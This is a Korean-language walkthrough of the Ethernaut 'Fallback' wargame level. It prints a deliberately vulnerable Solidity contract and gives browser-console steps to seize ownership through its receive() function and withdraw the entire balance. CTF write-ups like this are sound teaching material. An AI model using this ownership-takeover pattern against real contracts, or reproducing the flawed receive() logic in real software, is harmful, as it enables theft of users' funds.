## Ethernaut Level 1

---

## 문제 : Fallback

Look carefully at the contract's code below.

You will beat this level if

    you claim ownership of the contract
    you reduce its balance to 0

  Things that might help

    - How to send ether when interacting with an ABI
    - How to send ether outside of the ABI
    - Converting to and from wei/ether units (see `help()` command)
    - Fallback methods

---

## 컨트랙트 분석

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

- contribute()는 소량의 ETH만 허용 (< 0.001 ether)
- owner는 초기 contribution이 1000 ETH
- 따라서 정상적인 방법으로 owner를 바꾸는 것은 사실상 불가능합니다.

하지만 아래 코드가 문제입니다.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

- contribution이 0보다 크기만 하면 owner 변경 가능하다는 문제점이 있습니다.

---

## 공격 단계 

---

### Step 1 — 개발자 콘솔 열기

브라우저에서 F12 → Console 탭으로 이동

```javascript
await contract.address
```

---

### Step 2 — contribute() 호출

먼저 contribution을 0보다 크게 만들어야 한다.

```javascript
await contract.contribute({
  value: web3.utils.toWei("0.0001", "ether")
})
```

확인: 

```javascript
web3.utils.fromWei((await contract.getContribution()).toString(), "ether")
// → "0.0001"
```

---

### Step 3 — receive() 트리거 (핵심)

컨트랙트로 직접 ETH를 전송한다.

```javascript
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  value: 100000000000000
})
```

- value: 1 = 1 wei (최소 단위) 그러나 너무 값이 작아 거래가 안돼서 값을 조정함.
- 이 트랜잭션으로 receive() 함수 실행
- owner가 공격자로 변경됨

---

### Step 4 — owner 확인

```javascript
await contract.owner()
```

→ 자신의 주소로 변경된 것을 확인

---

### Step 5 — withdraw()

```javascript
await contract.withdraw()
```

→ 컨트랙트에 있는 ETH 전부 탈취